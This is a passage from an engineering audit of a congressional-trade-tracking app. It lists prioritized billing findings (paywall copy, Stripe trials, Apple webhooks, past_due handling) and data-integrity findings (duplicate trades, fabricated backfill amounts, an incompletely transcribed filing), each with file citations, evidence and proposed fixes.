- **Evidence:** app/src/ui/dashboardHtml.ts:11189-11191 `hasBillingAccount() { return !!(ME.billing && ME.billing.hasCustomer) || !!(ME.entitlement && ME.entitlement.status); }` — Apple path returns status 'active' (billing/entitlement.ts:72-80), so this is true with no Stripe customer. :11287,11298 `(hasBillingAccount() && portalConfigured() ? '<button onclick="manageBilling()">Manage Subscription</button>' : ...)`. :11485-11497 `manageBilling()` always POSTs /billing/portal; billing/routes.ts:240 `if (!user.stripeCustomerId) return c.json({ error: 'no billing account yet' }, 400);` → toast 'no billing account yet'. `grep -n 'entitlement.source' dashboardHtml.ts` → zero matches anywhere in the SPA.
- **Panel:** billing — hasBillingAccount() and manageBilling() read verbatim, exact match.  Confirmed grep for entitlement.source in dashboardHtml.ts returns nothing — the SPA truly never branches on it. · `billing/BILLING-04`

#### 65. [P2] iOS paywall sells 'Push notifications when a new filing lands' as Premium, but APNs fan-out goes to every signed-in device

- **Where:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:54  ·  **Surface:** Cross-surface  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The paywall promises a benefit that free signed-in users already receive, and the code comment that fan-out 'still requires Premium' is false.  Either the paywall is misleading (Apple 3.1.2 / FTC risk) or revenue is being given away; web and iOS also disagree on what Premium includes.
- **Impact:** Misleading paywall copy; inconsistent gating across platforms; possible revenue leakage.
- **Fix:** Decide: (a) gate fan-out on `isPremiumUserAsync` (join push_devices→users, OR apple ledger) and keep the bullet, or (b) drop the bullet from PremiumSheet and the Delivery footer.  Fix the commands.ts comment either way.
- **Evidence:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:54 `.init(systemImage: "bell", text: "Push notifications when a new filing lands")` (visible in ios/light/29-premium-sheet.png). app/src/client/commands.ts:232-234 comment: 'Device registration is signed-in only (not Premium-gated). Actual trade push fan-out still requires Premium ... when that path ships'. app/src/delivery/apnsFanout.ts:144 `const devices = await listAllActiveApnsDevices(env);` and client/pushDevices.ts:232-241 `SELECT ... FROM push_devices WHERE platform = 'apns' AND active = 1` — no join to users/entitlement. Web modal feature list (dashboardHtml.ts:11393-11419) does not list push at all.
- **Panel:** billing — All four citations quoted verbatim; listAllActiveApnsDevices genuinely has no entitlement join. · merged: app-store-compliance/APPSTORECOMPLIANCE-07, growth-onboarding/GROWTHONBOARDING-05 · `billing/BILLING-05`

#### 66. [P2] Every Stripe checkout grants a new 14-day trial — cancelled users can re-trial indefinitely

- **Where:** POST /billing/checkout  ·  **Surface:** Backend  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A user who trials, cancels, and re-subscribes (or repeats monthly) receives another free 2 weeks each time.
- **Impact:** Revenue leakage / trial abuse.
- **Fix:** Pass `trial_period_days` only when the user has never had a subscription (e.g. `user.subscriptionStatus == null && !user.stripeSubscriptionId`), or check Stripe for prior subscriptions on the customer; update the modal copy ('Start Free Trial' → 'Subscribe') for returning users.
- **Evidence:** app/src/billing/routes.ts:151 always passes `trialDays: await trialDays(c.env)`; stripe.ts:171 `...(args.trialDays && args.trialDays > 0 ? { trial_period_days: args.trialDays } : {})` with no check of `user.subscriptionStatus` / prior trial. `STRIPE_TRIAL_DAYS` default 14 per PremiumSheet.swift's dated verification comment (:363-366). Live prices carry `trial_period_days: null` per PR #1981 §4, so the trial is purely code-applied.
- **Panel:** billing — routes.ts:151 and stripe.ts:171 confirmed verbatim — no prior-subscription check exists anywhere in the checkout path. · `billing/BILLING-07`

#### 67. [P2] iOS paywall hard-codes '2-week free trial' and USD prices regardless of intro-offer eligibility or storefront

- **Where:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:365  ·  **Surface:** iOS  ·  **Category:** compliance  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Users who already consumed the intro offer (resubscribers) are told they get a free trial but StoreKit charges immediately; non-US storefronts see '$5/month' next to a localized displayPrice that differs.  Apple 3.1.2 requires accurate price/trial presentation.
- **Impact:** Misleading paywall; App Review and refund risk.
- **Fix:** Build the headline from `Product.displayPrice` + `subscription.subscriptionPeriod`, and show the trial line only when `await product.subscription?.isEligibleForIntroOffer == true` with the offer's actual period.
- **Evidence:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:369 `static let headline = "$5/month  •  $50/year  •  2-week free trial"`; purchase rows (215-250) use `product.displayPrice` and `PremiumPricing.subtitle(for:)` but never read `product.subscription?.introductoryOffer` or `isEligibleForIntroOffer` — confirmed via `grep -rn 'introductoryOffer|isEligibleForIntroOffer|IntroOffer' clients/ios/CongressTrade/` returning zero matches anywhere in the app. DeliveryView.swift:57,76 and FeedDashboardView.swift:1250 repeat '$5/month or $50/year, with a 2-week free trial' / '2-week free trial, then $5/month or $50/year'.
- **Panel:** billing — Full-file read of PremiumSheet.swift plus a repo-wide grep for introductoryOffer/isEligibleForIntroOffer confirms zero eligibility checks exist anywhere in the iOS app. · merged: app-store-compliance/APPSTORECOMPLIANCE-10, ios-engineering/IOSENGINEERING-25, ux-copy/UXCOPY-09 · `billing/BILLING-09`

#### 156. [P2] Source-PDF gate is inconsistent: backend gates the stored PDF, /pricing drops feature=pdf, web modal never mentions PDFs, and the government PDF URL is public anyway

- **Where:** app/src/delivery/rest.ts:1413  ·  **Surface:** Cross-surface  ·  **Category:** billing  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The product cannot decide whether the original filing PDF is a Premium benefit: iOS markets it as one, the backend gates only the R2 copy, the web modal does not mention it, and the public JSON/Source Filing button hands out the same document for free.
- **Impact:** Weak/misleading value proposition; confusing free-user experience (link opens, then a Delivery page with a modal).
- **Fix:** Pick one: (a) make the stored PDF a real Premium perk (fast, archived, never 404s) and say so on both paywalls with a 'pdf' intent, hiding sourceUrl behind auth; or (b) stop marketing PDFs as Premium and drop the gate.  Also carry `feature=` through /pricing.
- **Evidence:** app/src/delivery/rest.ts:1381 redirects to `/pricing?feature=pdf`; ui/routes.ts:221 `r.get('/pricing', (c) => c.redirect('/?pricing=1&view=subs', 302))` drops the param — reproduced live: `curl .../pricing?feature=pdf` → `302 .../?pricing=1&view=subs`. dashboardHtml.ts:12104-12105 only recognizes intents '1'/'true'/'alerts'/'export'; openPricing's feature lists (11393-11419) omit PDFs entirely; the static modal markup at 3283 'Direct access to source PDF files from Congress' is overwritten by openPricing() on every open. delivery/rows.ts:269 `sourceUrl: row.source_url ?? ''` confirms the field is served unauthenticated when populated (a 100-row live sample of seed data did not happen to include a populated one, so the specific unauthenticated-exposure claim is code-confirmed rather than freshly reproduced). iOS TradeDetailView.swift:246-251,270-279 shows a 'Source Filing' button (same original PDF) to everyone while PremiumSheet.swift:48 sells 'Open the original filing PDF from Congress' as Premium.
- **Panel:** billing — Reproduced the /pricing?feature=pdf -> /?pricing=1&view=subs redirect live.  All code citations confirmed verbatim. sourceUrl live-exposure was not caught in a quick 100-row sample (seed rows dominate) but the serialization path is confirmed in code, so this does not weaken the finding. · `billing/BILLING-14`

#### 202. [P2] Apple webhook ignores UPGRADE / RESUBSCRIBE / RENEWAL_EXTENDED, so the ledger's expires_date goes stale and Premium lapses on web

- **Where:** POST /api/webhooks/apple applyNotification  ·  **Surface:** Backend  ·  **Category:** billing  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** After an in-App-Store upgrade or resubscribe the server still holds the old product/expiry; when it passes, web Premium (CSV, PDF, delivery) lapses until the customer opens the iOS app while signed in.  PR #1981 notes SUBSCRIBED is unapplied but does not call out UPGRADE/RENEWAL_EXTENDED or the web-lapse consequence.
- **Impact:** Paying customers lose access on web; support load.
- **Fix:** Apply every notification that carries signedTransactionInfo for a known originalTransactionId by upserting productId/plan/expiresDate (generic path), treating SUBSCRIBED/DID_CHANGE_RENEWAL_PREF/RENEWAL_EXTENDED/OFFER_REDEEMED as 'active'.  Longer term add a server-side App Store Server API reconciliation (Get All Subscription Statuses) — no such client exists today (`grep storekit.itunes.apple.com` → none).
- **Evidence:** app/src/billing/appleWebhook.ts:57-64 handles only DID_RENEW, EXPIRED, DID_CHANGE_RENEWAL_STATUS, REVOKE, DID_FAIL_TO_RENEW, GRACE_PERIOD_EXPIRED. appleSubscriptions.ts:105-121 `activeAppleSubscriptionForUser` grants access only when `status IN ('active','grace_period') AND (expires_date IS NULL OR expires_date > now)`. An immediate monthly→annual upgrade arrives as DID_CHANGE_RENEWAL_PREF (subtype UPGRADE) with a new transaction/expiresDate; RESUBSCRIBE arrives as SUBSCRIBED; outage extensions as RENEWAL_EXTENDED — all fall outside HANDLED_NOTIFICATION_TYPES and are acknowledged-but-dropped. iOS self-heal only runs when `!isPremium` at launch: Store/AppleIAP.swift:78-81 `reconcileAppleEntitlementsQuietly() { guard signedIn, !isPremium else { return } }`.
- **Panel:** billing — HANDLED_NOTIFICATION_TYPES and reconcileAppleEntitlementsQuietly both confirmed verbatim; the mechanism described (stale ledger row surviving an upgrade/resubscribe until the app is opened signed-in) follows directly from the code.  Kept at medium confidence as the original did — the specific notification subtypes Apple sends for an in-place plan change are asserted from Apple's documented model, not captured live. · `billing/BILLING-06`

#### 203. [P2] Stripe past_due lapses Premium immediately with no grace and no dunning UI; Apple gets a grace period — and an iOS user can then double-buy

- **Where:** entitlement.ts + header/account menu (web) + PremiumSheet (iOS)  ·  **Surface:** Cross-surface  ·  **Category:** billing  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** A card decline silently downgrades the customer (webhooks/SSE deliveries stop, 402s), with no 'update your payment method' banner on web or iOS, and iOS then offers a fresh Apple purchase while Stripe is still retrying.
- **Impact:** Involuntary churn, confused customers, possible double billing.
- **Fix:** Either include `past_due` in PREMIUM_STATUSES for a bounded window (Stripe smart retries) or show a dunning banner/toast ('Payment failed — update your card' → portal) on web and iOS; hide the Apple purchase buttons when Stripe status is past_due; fix the entitlement.ts comment.
- **Evidence:** app/src/billing/entitlement.ts:19 `PREMIUM_STATUSES = new Set(['trialing','active'])`; :8-12 comment claims 'Stripe keeps the subscription in active during its smart-retry grace window' — Stripe in fact marks the subscription `past_due` on the first failed renewal invoice attempt, so access drops at once under this code. Apple path: appleSubscriptions.ts:82-84 `appleStatusGrantsAccess = status === 'active' || status === 'grace_period'`. No UI for past_due: `grep -n past_due dashboardHtml.ts` → no matches; `grep -rn 'past_due|pastDue' clients/ios/CongressTrade/` → no matches. renderAccount (dashboardHtml.ts:11270-11274) shows only a Premium/Trial badge; iOS Entitlement (Models.swift:22-33) has no status-driven messaging, so a past_due Stripe user sees the same PremiumSheet purchase flow and can buy a second subscription.
- **Panel:** billing — entitlement.ts comment and PREMIUM_STATUSES quoted verbatim; grep for past_due UI in both web and iOS trees confirmed empty.  The finding's characterization of Stripe's real-world behavior (status flips to past_due on the first failed invoice attempt, not after retries) matches Stripe's documented default subscription lifecycle, contradicting the code's own comment. · `billing/BILLING-08`

#### 213. [P3] No trial-end, renewal, or 'cancels on' date is shown anywhere (web or iOS); iOS Entitlement model still drops those fields

- **Where:** Web account menu / Premium badge; iOS Manage Subscription rows  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md I6)
- **What:** Customers cannot see when the 14-day trial converts to a charge, when the next renewal is, or that a cancellation has been scheduled — the information most likely to prevent 'I was charged unexpectedly' disputes.
- **Impact:** Chargebacks/refund requests; trust.
- **Fix:** Show 'Trial ends Aug 31 · then $5/mo', 'Renews Sep 14', or 'Premium until Sep 14 (cancelled)' under the badge / in the iOS subscribed section; decode the fields in Swift.
- **Evidence:** app/src/ui/dashboardHtml.ts:11270-11274 badge is only 'Trial' or 'Premium'; `grep -n 'cancelAtPeriodEnd|currentPeriodEnd|trialEnd' dashboardHtml.ts` → no matches, although /auth/me returns them (billing/entitlement.ts:37-45 Entitlement fields). clients/ios/CongressTrade/Models.swift:22-33 `struct Entitlement { premium, status, plan, source }` — trialing/trialEnd/currentPeriodEnd/cancelAtPeriodEnd are not decoded (docs/reviews/2026-07-28-full-app-review.md I6).
- **Panel:** billing — Grep for the three field names in dashboardHtml.ts returned nothing; Models.swift Entitlement struct read verbatim, confirmed only premium/status/plan/source are decoded. · `billing/BILLING-13`

#### 214. [P3] iOS 'Manage on App Store' opens Safari instead of the in-app StoreKit manage-subscriptions sheet

- **Where:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:178-196  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** StoreKit offers `AppStore.showManageSubscriptions(in:)` which presents the native sheet without leaving the app; the web URL bounces through Safari/App Store and sometimes asks for re-auth.
- **Impact:** Friction in the cancel/upgrade path; minor.
- **Fix:** Call `try await AppStore.showManageSubscriptions(in: windowScene)` for `source == "apple"`, falling back to the URL on error.
- **Evidence:** clients/ios/CongressTrade/Store/ManageSubscription.swift returns `.url(CongressTradeAPIClient.appStoreManageSubscriptionsURL)` for `entitlementSource == "apple"` → APIClient.swift:138 `static let appStoreManageSubscriptionsURL = URL(string: "https://apps.apple.com/account/subscriptions")!`; PremiumSheet.swift:346-348 and Components.swift:965-968 both call `openURL(url)` on the result — no use of `AppStore.showManageSubscriptions(in:)` anywhere in the file.
- **Panel:** billing — Confirmed both call sites use openURL(url), and confirmed appStoreManageSubscriptionsURL is a plain https link, not the native StoreKit sheet API. · `billing/BILLING-19`

#### 215. [P3] Admin diagnostics counts subscribers from Stripe columns only — Apple subscribers are invisible; no MRR/plan breakdown anywhere

- **Where:** GET /api/admin/diagnostics  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Ops/owner cannot see how many paying customers exist once iOS IAP is live, nor plan mix or source.
- **Impact:** Blind spot for revenue monitoring and churn.
- **Fix:** Count `users` (Stripe) UNION active `apple_subscriptions` rows; expose plan/source breakdown and estimated MRR in diagnostics.
- **Evidence:** app/src/admin/routes.ts:4374 `SUM(CASE WHEN subscription_status IN ('active','trialing') THEN 1 ELSE 0 END) AS subscribed_users ... FROM users` — no join to `apple_subscriptions`; `grep -n apple_subscriptions app/src/admin/routes.ts` → zero matches in the entire admin routes file.
- **Panel:** billing — Query confirmed verbatim; grep for apple_subscriptions in admin/routes.ts returns nothing. · `billing/BILLING-20`

#### 216. [P3] 'You're in! Your premium trial is active' toast fires from the URL param alone; success_url carries no session id and the page does not re-verify entitlement

- **Where:** /?checkout=success handling  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** tracked-in-PR-#1981 (noted, no fix PR)
- **What:** If the webhook is delayed the customer sees 'You're in' while the header still shows Upgrade and CSV/Delivery remain 402; the toast is also spoofable.
- **Impact:** Confusing first minutes after purchase; support pings.
- **Fix:** Append `session_id={CHECKOUT_SESSION_ID}`, have the SPA poll /auth/me (or a `/billing/checkout/:session` verifier) until premium, showing 'Activating your subscription…' until then.
- **Evidence:** app/src/billing/routes.ts:149 `successUrl: \`${base}/?checkout=success\`` (no `{CHECKOUT_SESSION_ID}`); dashboardHtml.ts:11605 `if (checkout === 'success') showToast('🎉 You're in! Your premium trial is active.');` — no call to `/billing/status`/`loadMe()` retry loop anywhere in `handleAuthQueryParams` (11598-11612); entitlement arrives only via webhook (routes.ts:306-316). Anyone can open https://congress.trade/?checkout=success and see the toast. PR #1981 §4 'Stripe notes' mentions the toast assumption.
- **Panel:** billing — successUrl and handleAuthQueryParams both quoted verbatim — confirmed the toast is purely client-side URL-param driven with no server re-check. · `billing/BILLING-21`

#### 217. [P3] Web modal feature lists differ per entry point and from iOS — three different Premium definitions

- **Where:** openPricing copy variants vs PremiumSheet benefits  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A prospect comparing the website and the app sees different benefit lists and limits.
- **Impact:** Trust/clarity; parity.
- **Fix:** Single source of truth for Premium benefits (shared JSON or doc) rendered identically in the web modal (all intents) and PremiumSheet, including the 2-method cap.
- **Evidence:** app/src/ui/dashboardHtml.ts:11393-11419 — 'alerts' intent lists 2 features, 'export' lists 3, default lists 3 (CSV/webhooks/SSE); static HTML at 3283-3287 lists 5 features incl. push + PDFs but is overwritten by openPricing() on every modal open (confirmed: openPricing sets `el('pricingFeatures').innerHTML` unconditionally at :11428); PremiumSheet.swift:47-55 lists PDF, CSV, delivery (up to two methods), push. The '2 delivery methods' cap (MAX_SUBSCRIPTIONS_PER_USER) is stated in PremiumSheet's benefit text but absent from the live web modal's JS-driven copy (screenshot desktop/pricing.png; the static markup's note at 3287 is likewise overwritten).
- **Panel:** billing — pricingCopy()/openPricing() and the static modal markup both confirmed verbatim, including that the static 5-item list is clobbered by the JS-driven 2-or-3-item lists on open. · `billing/BILLING-28`

#### 334. [P3] Legacy /billing/apple/confirm writes 'apple:<id>' into users.stripe_subscription_id, after which a later Stripe subscription update fails closed and never applies

- **Where:** POST /billing/apple/confirm + applySubscription WHERE clause  ·  **Surface:** Backend  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** tracked-in-PR-#1981 (PR E, partial)
- **What:** Any account that ever hit the legacy confirm route (old iOS builds) can never be upgraded via Stripe afterwards — the webhook succeeds (200) but the user stays non-premium.  PR #1981 PR E suggests pointing confirm at apple_subscriptions but does not name this failure mode.
- **Impact:** Silent lost sale for affected accounts; hard-to-diagnose support case.
- **Fix:** Rewrite /billing/apple/confirm to upsert `apple_subscriptions` (same as redeem_apple_purchase) and stop touching `users.stripe_*`; one-off migration to move existing 'apple:' rows to the ledger and NULL the column.
- **Evidence:** app/src/billing/routes.ts:210-224 `const appleSubId = \`apple:${originalId}\`; UPDATE users SET ... stripe_subscription_id = ? ...` [appleSubId]; subscription.ts:198-228 the UPDATE requires `stripe_subscription_id IS NULL OR stripe_subscription_id = ? OR EXISTS (SELECT 1 FROM stripe_subscription_event_state WHERE subscription_id = users.stripe_subscription_id ...)` — no event-state row is ever created for an 'apple:…' subscription id (that table is only populated by real Stripe webhook processing), so `customer.subscription.created/updated` for that user updates zero rows silently (the webhook still returns 200).
- **Panel:** billing — Both citations read verbatim; the WHERE-clause logic genuinely has no path that would match an 'apple:' subscription_id, confirming the silent-failure mechanism as described. · `billing/BILLING-22`

#### 427. [P4] Revoked/refunded Apple transactions are re-delivered by Transaction.updates forever because the server rejects them and the app never finishes them

- **Where:** Store/AppleIAP.swift observeAppleTransactions  ·  **Surface:** iOS  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** After a refund/revocation the transaction (revocationDate set) is replayed on each launch, each time producing a 400 and a failed command row; harmless to the customer but noisy and wastes a command slot per launch.
- **Impact:** Log/command-ledger noise; minor battery/network.
- **Fix:** In observeAppleTransactions, `finish()` transactions whose `revocationDate != nil` or `expirationDate < now` without calling redeem; only leave unfinished the ones that should retry.
- **Evidence:** clients/ios/CongressTrade/Store/AppleIAP.swift:69-71 `try? await redeemAppleTransaction(transaction, jws: result.jwsRepresentation)` — `redeemAppleTransaction` (21-27) only calls `transaction.finish()` after `api.redeemApplePurchase` succeeds; server rejects revoked/expired transactions: commands.ts:318-320 `if (!appleTransactionIsActive(transaction)) throw new ClientInputError('this Apple transaction is not an active subscription')`. Since the outer call uses `try?`, the throw is swallowed and finish() is skipped, leaving the transaction unfinished for the next `Transaction.updates` delivery.
- **Panel:** billing — Full read of AppleIAP.swift confirms the finish()-after-server-success ordering and the try?-swallowed-error mechanism exactly as described. · `billing/BILLING-23`

#### 428. [P4] Annual plan is not promoted on iOS (monthly is the primary button, no 'save 17%' cue) — web shows SAVE ~17%

- **Where:** PremiumSheet purchase rows  ·  **Surface:** iOS  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Default emphasis differs across platforms; annual is usually the higher-LTV choice and web already nudges it.
- **Impact:** Lower annual mix on iOS; parity.
- **Fix:** Make annual the primary (or add a 'Save 17%' badge) on iOS to match web, or pick one default for both and document it in FLEET-UI-COPY.
- **Evidence:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:277 `products = try await Product.products(for: ids).sorted { $0.price < $1.price }` and :216 `let isPrimary = product.id == products.first?.id` → cheapest (monthly) is borderedProminent; :374 annual subtitle is 'two months cheaper than monthly' only, no badge. web dashboardHtml.ts:3293 `<span class="save">SAVE ~17%</span>` on the Annual plan tile.
- **Panel:** billing — Both citations confirmed verbatim; price-ascending sort plus 'first item is primary' does make monthly the prominent button. · `billing/BILLING-24`

#### 465. [P4] Tax/currency handling is USD-only and automatic_tax is only enabled under Managed Payments; ToS promises 'plus any applicable taxes'

- **Where:** createCheckoutSession  ·  **Surface:** Backend  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (low confidence)
- **What:** If Managed Payments is not approved/enabled, no sales tax/VAT is collected while ToS says it is; non-US buyers see USD only.
- **Impact:** Tax exposure (low at current scale); minor international friction.
- **Fix:** Confirm STRIPE_MANAGED_PAYMENTS is on in prod; otherwise enable `automatic_tax: {enabled: true}` + `customer_update: {address: 'auto'}`; consider Stripe Adaptive Pricing for currency.
- **Evidence:** app/src/billing/stripe.ts:166 `managedPayments === 'true' ? { managed_payments: { enabled: true } } : {}` — no `automatic_tax`, `tax_id_collection`, `billing_address_collection` or adaptive pricing configured otherwise; hard-coded `$5`/`$50` in dashboardHtml.ts:3290,3295 and PremiumSheet.swift:369; legalHtml.ts:81 'plus any applicable taxes'. Live STRIPE_MANAGED_PAYMENTS value not verifiable read-only.
- **Panel:** billing — createCheckoutSession quoted verbatim — the only tax-adjacent code path is the managed_payments flag, gated by a secret this review cannot read live, matching the finding's own stated confidence. · `billing/BILLING-26`

### Data integrity: duplicates, fabricated amounts and filer identity (33)

The corpus holds the same real-world trade two or three times under different sources, one of which stamps fabricated amounts and filing dates, and filer identities are split and mislabelled.  Every headline number on Trends inherits those errors.

#### 8. [P0] Same real-world trade stored 2-3x across primary/manual/local_mac/competitor_backfill and counted as separate trades everywhere

- **Where:** app/src/analytics/sql.ts:246-291 (buildCommonFilters, new EXEC- guard at ~291); app/src/ui/dashboardHtml.ts:4794-4798  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new
- **What:** Every Trends aggregate, the Trades tab total, ticker and member drawers sum raw transaction rows, but the corpus now holds the same trade under several `source` values (manual extraction re-run + primary + competitor backfill + local_mac), so counts, est. volume, net flow, member-per-ticker breadth and trade-based leaderboards are inflated by at least 20% and very unevenly (HUBB/BEP/TSCO/SPCX ~2-3x).
- **Impact:** Headline numbers users see (2,178 trades, +$8.2m net flow, '13 politicians bought SPCX', Rising Activity 0→13) are materially wrong; the same trade can appear twice in the Trades list and in a member's Recent Trades.
- **Fix:** Dedupe at the analytics/feed layer: compute a canonical trade key (filer_id, tx_date, ticker-or-normalized-asset, side, bracket, owner) and a source precedence (primary > manual > local_mac > competitor_backfill); either mark losers `deprecated_at`/`superseded_by` at ingest or use a `WHERE NOT EXISTS` twin guard in buildCommonFilters and buildTxFilters.  Add a regression test that a doc_id with both manual+primary rows counts once.  Show a 'source' footnote in Trends until done.
- **Evidence:** curl /api/analytics/ticker/TSCO?window=90d: Fleischmann 2026-06-09 S TSCO appears 3x — `manual H-2026-9116212 1000-15000`, `primary H-2026-20034932 1001-15000`, `competitor_backfill COMPETITOR-fleischmann_TSCO_2026-06-09_sell`. /ticker/SPCX: Timmons 2026-06-15 B 50001-100000 ×3 (manual H-2026-20035042, primary H-2026-20035042, primary H-2026-20022577) + competitor copy. /ticker/NVDA 90d: 14 rows, ~8 distinct trades (Fields NVDA ×3: manual+competitor+primary). Khanna 2026-06-02: 186 rows (150 manual, 36 competitor); `manual H-2026-9116206 Xylem Inc. CMN ticker=None` and `competitor COMPETITOR-khanna_XYL_2026-06-02_buy ticker=XYL` are the same buy. Full 90d feed (2,185 rows, 9 pages of /api/transactions?from=2026-05-20): 463 rows (21.2%) share (lastname, tx_date, asset, side) with an earlier row; 261 of 522 competitor rows have a primary/manual twin; 101 primary-vs-manual twins — lower bound because manual rows often lack tickers. Analytics never dedupes: sql.ts:246-262 buildCommonFilters only drops deprecated/provider-missing rows; Trades tab client filter drops only seed_dataset (dashboardHtml.ts@origin/main:4794-4798 `if (primaryOnly && r.source === 'seed_dataset') return false`). Consensus card TSCO reads '4 politicians · 13 trades' (trends-full.png) — real is 3 politicians / ~6 trades.
- **Panel:** data-correctness — Reproduced live 2026-08-19: /api/analytics/ticker/TSCO?window=90d shows the exact three-way Fleischmann duplicate (manual amountMin 1000, manual amountMin 1001, competitor_backfill amountMin 1001) and /api/analytics/ticker/HUBB?window=90d shows MANUAL-DELANEY(9)+April McClain Delaney(8) both counted.  Note: origin/main has since added a guard (sql.ts:291) excluding competitor_backfill rows whose filer_id starts EXEC- from analytics aggregates, but this does not touch the manual/primary/competitor duplication on real (non-EXEC) members shown above, so the finding is unchanged in substance. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-01 · `data-correctness/DATACORRECTNESS-01`

#### 9. [P0] competitor_backfill rows carry fabricated amounts ($1,001–$15,000 on 100% of rows) and filed_date = trade date (lag 0, 'on_time')

- **Where:** app/src/delivery/rows.ts:224-234  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The competitor backfill importer stores a default bracket and stamps the filing date equal to the transaction date, then publishes those rows as first-class trades.  Any $ metric, the Trades 'Lag' column, STOCK Act status filters (?stockAct=), and per-trade performance that lands on one of these rows is wrong.
- **Impact:** A $1m–$5m Pelosi option purchase is also shown as an $8k stock buy; 'on_time' / 0-day lag is asserted for rows with no filing date at all; Top Performers size-weights and member drawers score fabricated rows (see -08).
- **Fix:** Null out amount_min/max, filed_date, stock_act_status and confidence on competitor_backfill rows where the provider did not supply them (amount 'undisclosed' → NULL, not 1001–15000); exclude competitor rows from $ aggregates and lag stats until a real bracket exists; surface 'bracket unavailable' in the UI instead of $1k–$15k.
- **Evidence:** Feed sample: `competitor brackets Counter({(1001, 15000): 522})` — all 522 competitor rows in the 90d window are $1,001–$15,000, while their primary twins are other brackets: Timmons SPCX primary 50001-100000 vs competitor 1001-15000; Meuser SPCX 15001-50000 vs 1001-15000; Whitehouse NVDA 15001-50000 vs 1001-15000; Alan Armstrong WMB manual 5000001-25000000 vs competitor 1001-15000; Pelosi 2026-05-29 INTC primary `OP option 1000001-5000000 isOption=true` vs competitor `stock 1001-15000 isOption=false`. /api/transactions shows competitor rows with `filedDate == txDate`, `disclosureLagDays: 0`, `stockActStatus: 'on_time'`, `confidence 100` (e.g. COMPETITOR-khanna_MU_2026-04-27_sell). rows.ts@origin/main:224-234 falls back to t.filed_date for competitor rows.
- **Panel:** data-correctness — Reproduced live 2026-08-19: curl /api/transactions?ticker=HUBB&limit=30, all 20 competitor_backfill rows returned show filedDate == txDate exactly, disclosureLagDays:0, stockActStatus:'on_time', confidence:100, amountMin:1001/amountMax:15000 — 100% rate confirmed, matches the raw finding exactly. rows.ts:224-234 fallback logic quoted and confirmed at origin/main. · `data-correctness/DATACORRECTNESS-02`

#### 10. [P0] Human 'manual' review resolution published only 1 of 3 disclosed transactions for an OPM Director's OGE filing, omitting a $1,000,001-$5,000,000 stock sale

- **Where:** app/src/admin/routes.ts:2670-2729 (shifted +9 lines from the cited 2661-2720 due to an unrelated auth-doc/session-helper edit earlier in the file; logic unchanged)  ·  **Surface:** Backend  ·  **Category:** extraction-accuracy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The review-queue 'manual' decision path (POST /review/:docId with decision='manual', requiring an admin to supply explicit `edits`) is meant to be the authoritative human backstop when automated extraction fails outright (as it did here -- 0 rows).  In this case the backstop itself dropped 2 of the filer's 3 disclosed transactions, including the largest one by dollar value.  This is not a heuristic or confidence-threshold miss; it is a verified, reproduced gap between the filed government-ethics document and what congress.trade shows for a senior executive-branch official.
- **Impact:** A sitting OPM Director's largest disclosed 2025 stock sale ($1M-$5M, Samsara/IOT) and a Coinbase options-related sale are invisible to every congress.trade user, the /api/transactions feed, the Premium CSV export, and the iOS client (all share this backend).  Anyone using the product to check a senior official's trading activity gets an incomplete and misleadingly small picture.  If discovered independently this is a credibility/legal-risk exposure for a product whose entire value proposition is faithful transcription of STOCK Act/OGE disclosures.
- **Fix:** Immediately re-open review for E-2026-scott-a-kupor-01-09-2026-278t and insert the 2 missing rows.  More importantly, add a structural safety check to the manual-edit path: when an admin supplies fewer transaction edits than the source document appears to contain (e.g. cross-check row count against a raw-text scan of the stored PDF, or simply require the admin to explicitly confirm 'N of M rows entered' before publish), block silent under-transcription.  Consider a periodic reconciliation job that re-runs textPdf/ogeText against already-published 'manual' docs and flags a mismatch in transaction count for re-review.
